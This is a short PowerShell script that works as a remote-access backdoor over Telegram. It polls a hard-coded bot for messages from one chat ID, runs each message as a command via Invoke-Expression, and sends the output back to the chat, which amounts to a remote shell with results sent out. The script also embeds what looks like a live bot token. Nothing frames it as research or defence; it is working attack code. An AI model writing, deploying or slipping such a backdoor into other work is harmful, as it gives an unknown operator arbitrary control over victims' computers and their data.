# Telegram Bot Token and Chat ID
$BOT_TOKEN = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs"
$CHAT_ID = "2047893044"
$TELEGRAM_API = "https://api.telegram.org/bot$BOT_TOKEN"

# Function to execute commands
function Execute-Command {
    param (
        [string]$Command
    )
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        return $output
    }
    catch {
        return "Error executing command: $_"
    }
}

# Function to send message to Telegram
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    try {
        $uri = "$TELEGRAM_API/sendMessage"
        $body = @{
            chat_id = $CHAT_ID
            text = $Message
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body | Out-Null
    }
    catch {
        Write-Error "Failed to send Telegram message: $_"
    }
}

# Main loop to poll for new messages
$offset = 0
while ($true) {
    try {
        # Get updates from Telegram
        $uri = "$TELEGRAM_API/getUpdates?offset=$offset"
        $updates = Invoke-RestMethod -Uri $uri -Method Get

        foreach ($update in $updates.result) {
            if ($update.message -and $update.message.chat.id -eq $CHAT_ID) {
                $command = $update.message.text
                $message_id = $update.message.message_id

                # Execute the command and get output
                $output = Execute-Command -Command $command

                # Send the output back to Telegram
                Send-TelegramMessage -Message "Command: $command`nOutput:`n$output"

                # Update offset to mark message as processed
                $offset = $update.update_id + 1
            }
        }
    }
    catch {
        Write-Error "Error in main loop: $_"
    }

    # Wait before polling again to avoid rate limits
    Start-Sleep -Seconds 2
}
